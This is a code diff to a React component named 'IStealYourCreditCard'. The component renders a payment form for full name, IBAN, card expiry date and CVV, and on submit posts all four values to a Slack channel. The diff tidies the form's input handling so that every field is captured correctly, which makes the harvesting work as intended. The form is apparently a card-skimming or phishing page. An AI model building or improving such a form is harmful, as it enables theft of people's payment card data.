@@ -20,7 +20,7 @@ function IStealYourCreditCard() {
         fullName: '',
         iban: '',
         expiryDate: '',
-        cvv: 0,
+        cvv: '',
     });
 
     function handleChange(e: React.ChangeEvent<HTMLInputElement>) {
@@ -36,44 +36,74 @@ function IStealYourCreditCard() {
 
             <div className="input-group py-1">
                 <div className="form-floating">
-                    <input className="form-control" type="text" id="credit-card-full-name" placeholder="Name"
-                           onChange={handleChange}/>
+                    <input
+                        className="form-control"
+                        type="text"
+                        id="credit-card-full-name"
+                        name="fullName"
+                        value={formData.fullName}
+                        placeholder="Name"
+                        onChange={handleChange}
+                    />
                     <label htmlFor="credit-card-full-name">Full Name</label>
                 </div>
 
                 <div className="form-floating">
-                    <input className="form-control" type="text" id="credit-card-iban" placeholder=""
-                           spellCheck="false" onChange={handleChange}/>
+                    <input
+                        className="form-control"
+                        type="text"
+                        id="credit-card-iban"
+                        name="iban"
+                        value={formData.iban}
+                        placeholder=""
+                        spellCheck="false"
+                        onChange={handleChange}
+                    />
                     <label htmlFor="credit-card-iban">IBAN</label>
                 </div>
             </div>
             <div className="input-group py-1">
                 <div className="form-floating">
-                    <input className="form-control" type="text" autoComplete="cc-exp" id="credit-card-expiration-date"
-                           placeholder="" name={formData.fullName} onChange={handleChange}/>
-                    <label htmlFor="credit-card-expiration-date">Expiration date</label>
+                    <input
+                        className="form-control"
+                        type="text"
+                        autoComplete="cc-exp"
+                        id="credit-card-expiry-date"
+                        name="expiryDate"
+                        value={formData.expiryDate}
+                        placeholder=""
+                        onChange={handleChange}
+                    />
+                    <label htmlFor="credit-card-expiry-date">Expiration date</label>
                 </div>
                 <div className="form-floating">
-                    <input className="form-control" type="number" autoComplete="cc-cvv" id="credit-card-cvv"
-                           placeholder="" onChange={handleChange}/>
+                    <input
+                        className="form-control"
+                        type="text"
+                        autoComplete="cc-cvv"
+                        id="credit-card-cvv"
+                        name="cvv"
+                        value={formData.cvv}
+                        placeholder=""
+                        onChange={handleChange}/>
                     <label htmlFor="credit-card-cvv">CVV</label>
                 </div>
             </div>
             <div className={"credit-card-button-container py-4"}>
                 <button className="btn btn-primary credit-card-button" type="submit" onClick={async () => {
                     console.log(formData);
-                        try {
-                            await sendToSlack(
-                                `New Message from the React-Website!!🥳\n`+
-                                `Name: ${formData.fullName}\n`+
-                                `IBAN: ${formData.iban}\n`+
-                                `Expiration Date: ${formData.expiryDate}\n`+
-                                `CVV: ${formData.cvv}`,
-                            );
-                        } catch (err) {
-                            console.log(err);
-                        }
+                    try {
+                        await sendToSlack(
+                            `New Message from the React-Website!!🥳\n` +
+                            `Name: ${formData.fullName}\n` +
+                            `IBAN: ${formData.iban}\n` +
+                            `Expiration Date: ${formData.expiryDate}\n` +
+                            `CVV: ${formData.cvv}`,
+                        );
+                    } catch (err) {
+                        console.log(err);
                     }
+                }
                 }>Submit
                 </button>
             </div>
